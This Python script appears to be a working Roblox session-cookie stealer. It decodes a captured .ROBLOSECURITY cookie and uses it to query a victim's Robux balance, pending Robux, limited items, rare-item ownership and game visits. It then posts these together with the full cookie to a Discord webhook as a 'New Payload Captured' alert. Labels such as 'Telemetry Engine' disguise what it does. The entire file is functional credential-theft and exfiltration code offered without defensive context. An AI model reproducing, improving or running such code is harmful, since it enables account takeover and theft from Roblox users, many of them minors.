import sys
import base64
import os
import urllib.request
import urllib.error
import json
import re
import time
from datetime import datetime, timezone

def get_csrf_token(headers):
    try:
        req = urllib.request.Request("https://auth.roblox.com/v1/logout", headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=10) as res:
            pass
    except urllib.error.HTTPError as e:
        return e.headers.get("X-CSRF-Token")
    except Exception:
        pass
    return None

def safe_get(url, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Roblox/WinINet'})
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return json.loads(res.read().decode('utf-8'))
    except Exception:
        pass
    return None

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
            decoded_script = sys.argv[1]

        roblosecurity = decoded_script.strip()
        cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
        if cookie_match:
            roblosecurity = cookie_match.group(1)

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        # Spoofed user-agent matching WinINet requirement
        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Roblox/WinINet",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        csrf_token = get_csrf_token(headers)
        if csrf_token:
            headers["X-CSRF-Token"] = csrf_token

        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        account_age_days = 0
        
        # Financial / Limited metrics
        total_rap = 0
        limiteds_count = 0
        
        # Assets flags
        has_korblox = False
        has_headless = False

        # Game Metrics
        games_count = 0
        total_visits = 0

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers)
            if user_info and "created" in user_info:
                try:
                    created_dt = datetime.fromisoformat(user_info["created"].replace("Z", "+00:00"))
                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
                except Exception:
                    pass

            # 1. Fetch Robux Balance
            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            if economy_data:
                robux_balance = economy_data.get("robux", 0)

            # 2. Fetch Pending Robux
            totals_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary", headers)
            if totals_data:
                pending_robux = totals_data.get("pendingRobux", 0)

            # 3. Collectibles & RAP Calculation
            collectibles_data = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100", headers)
            if collectibles_data and "data" in collectibles_data:
                for item in collectibles_data["data"]:
                    total_rap += item.get("recentAveragePrice", 0)
                    limiteds_count += 1

            # 4. Korblox & Headless Ownership Check (Asset IDs)
            korblox_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/48545806", headers)
            if korblox_res and korblox_res.get("data"):
                has_korblox = True

            headless_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/4819740796", headers)
            if headless_res and headless_res.get("data"):
                has_headless = True

            # 5. Public Games & Visits Check
            games_data = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=Public&limit=50", headers)
            if games_data and "data" in games_data:
                for game in games_data["data"]:
                    games_count += 1
                    total_visits += game.get("placeVisits", 0)

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
        full_cookie_display = f"```text\n{roblosecurity}\n```"

        # Formatted Discord Payload matching dashboard design
        payload = {
            "content": f"@everyone New Payload Captured from **{username}**!",
            "username": f"{username} | RBXDEV Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Game Visits: `{total_visits}`\n"
                    f"> • Public Games: `{games_count}`\n\n"
                    f"🪙 **Economy Section**\n"
                    f"> • Balance: `{robux_balance}`\n"
                    f"> • Pending: `{pending_robux}`\n"
                    f"> • RAP: `{total_rap}`\n"
                    f"> • Limiteds Count: `{limiteds_count}`\n\n"
                    f"🎒 **Items & Bundles**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Full Captured Cookie**:\n{full_cookie_display}"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
            }]
        }

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            webhook_url, data=data,
            headers={'Content-Type': 'application/json', 'User-Agent': 'Roblox/WinINet'}
        )

        for attempt in range(3):
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    print(f"DEBUG: Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
                    break
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    time.sleep(3 * (attempt + 1))
                else:
                    raise e

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
